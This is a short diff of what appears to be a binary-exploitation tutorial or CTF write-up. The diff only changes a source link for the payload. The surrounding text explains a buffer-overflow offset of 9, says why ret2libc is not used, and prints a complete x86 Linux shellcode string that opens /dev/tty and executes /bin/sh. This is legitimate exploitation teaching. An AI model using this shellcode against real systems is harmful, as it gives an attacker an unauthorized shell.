@@ -153,7 +153,7 @@ es             0x7b	123
 fs             0x0	0
 gs             0x33	51
 ```
-Now, we observe that register overwriting begins at the tenth character, suggesting an offset of 9. This size makes it fairly impossible to use a classic <code>ret2libc</code> attack, so we will use a <code>shellcode</code> for this purpose. The piece of hexadecimal code that we use as a payload for execution has already been pre-made for us in [shellcode injection](https://0xrick.github.io/binary-exploitation/bof5/):
+Now, we observe that register overwriting begins at the tenth character, suggesting an offset of 9. This size makes it fairly impossible to use a classic <code>ret2libc</code> attack, so we will use a <code>shellcode</code> for this purpose. The piece of hexadecimal code that we use as a payload for execution has already been pre-made for us in [shellcode injection](https://www.exploit-db.com/exploits/13357):
 ``` shell
 \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
